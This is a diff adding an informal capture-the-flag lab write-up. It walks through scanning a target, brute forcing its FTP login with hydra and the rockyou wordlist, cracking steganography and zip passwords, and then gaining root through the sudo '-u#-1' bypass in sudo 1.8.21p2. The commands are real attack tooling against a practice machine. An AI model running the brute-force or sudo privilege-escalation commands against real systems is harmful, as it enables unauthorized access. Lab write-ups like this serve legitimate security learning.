@@ -1,0 +1,135 @@
+codename
+
+first i started with rustscan 
+
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+
+visited port 80
+
+saw this
+
+Dear agents,
+
+Use your own codename as user-agent to access the site.
+
+From,
+Agent R
+
+so the website said to visit the website as the code name
+
+i have an extention installed which can change user-agent manually
+
+i started changing the user agent or you can also use burp to change user agent field
+
+and got a redirection in C useragent after that i got redirected on this http://10.10.124.184/agent_C_attention.php
+
+and the data was : 
+
+Attention chris,
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
+
+From,
+Agent R 
+
+tried to brutforce ftp password with this
+
+
+hydra -l chris -P ~/Desktop/payloads/wordlist/rockyou.txt 10.10.124.184 ftp -t63 -Vv -I
+
+
+got password as crystal
+
+
+
+and downloaded all the files present in the directory after that
+
+i got 3 files there was one .jpg , .png , .txt
+
+the .png file was the blackhole file i wasted i hour on that lol but then i tried cracking the .jpg file with steg seek 
+
+stegseek -sf cute-alien.jpg -wl rockyou.txt -xf hello
+
+and i got the password : area51
+
+and i found the files
+
+Hi james,
+
+Glad you find this message. Your login password is hackerrules!
+
+Don't ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+chris
+
+
+i got the password now logged in into ssh 
+
+
+directly after logging into the machine i typed sudo -l
+
+and then i saw this
+
+ (ALL, !root) /bin/bash
+
+
+i remebered this vuln in one of the thm box
+
+and looked for the sudo version and looked that vuln
+
+Sudo version 1.8.21p2
+
+exploit was : sudo -u#-1 /bin/bash
+
+
+and i got  root
+
+
+
+
+as i havent done one of the question that is opening a zip file 
+yeah you are right the .png file isnt a black hole 
+
+i tried to binwalk the file first by binwal -e thepngfile
+
+and i got a zip ffile in it tried to unzip it using
+
+unzip file 
+
+but didnt succeded as showing some error idk why then i did opened the file by  using 7zip
+
+by "7z x file"
+
+it asked me for a password 
+
+i cracked the password by using jtr
+
+
+zip2john > hash
+
+john --format=zip hash
+
+this cracked the password i got to see the passsword by
+
+john hash --show
+
+it was alien after that i read the context of the file which showed some random character which was passsword for a file idk which one
+
+tried analyze it using hash analyser
+
+https://www.tunnelsup.com/hash-analyzer/
+
+
+it was base64 decoded it by using
+
+echo QXJlYTUx | base64 -d
+
+and the plain text was area51 which was actually password for the jpg file which we already cracked using the stegseeek lol!!!
+
+
+btw cheers for the root user! thanks
